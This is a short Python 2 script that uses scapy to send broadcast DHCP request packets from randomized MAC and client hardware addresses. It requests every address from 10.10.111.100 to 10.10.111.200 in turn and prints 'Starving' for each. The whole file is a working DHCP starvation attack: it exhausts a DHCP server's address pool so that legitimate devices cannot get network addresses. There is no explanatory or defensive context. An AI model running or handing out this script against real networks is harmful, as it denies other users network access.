from scapy.all import *
from time import sleep

def lol():
	for i in xrange(101):
		
		if i == 107: continue
		
		requested_addr = "10.10.111."+str(100+i)

		pkt=Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
		pkt/=IP(src="0.0.0.0",dst="255.255.255.255")
		pkt/=UDP(sport=68,dport=67)
		pkt/=BOOTP(chaddr=RandString(12,'0123456789abcdef'))
		pkt/=DHCP(options=[("message-type","request"),("requested_addr",requested_addr),"end"])

		sendp(pkt)
		
		print "Starving "+requested_addr
		
		sleep(0.5)


if __name__=="__main__": lol()